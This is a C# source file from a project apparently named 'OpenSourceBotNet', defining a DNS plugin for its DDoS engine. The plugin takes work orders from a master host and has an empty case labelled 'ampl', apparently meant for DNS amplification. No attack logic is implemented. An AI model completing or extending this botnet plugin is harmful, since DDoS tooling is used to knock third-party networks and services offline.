using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OpenSourceBotNet.Plugins.Engines.DDoS.Plugins
{
    public class DNS : OpenSourceBotNet.Plugins.Engines.Plugins.DDoS.DDoSEnginePlugin
    {
        public DNS()
        {

        }

        public override object[] WorkRequest(string sMasterHostWorkRequest)
        {
            object[] obj = null;

            if (sMasterHostWorkRequest != "0")
            {
                string sWorkID = sMasterHostWorkRequest.Substring(0, 4);

                switch (sWorkID)
                {
                    case "ampl":

                        break;
                }
            }

            return obj;
        }
    }
}
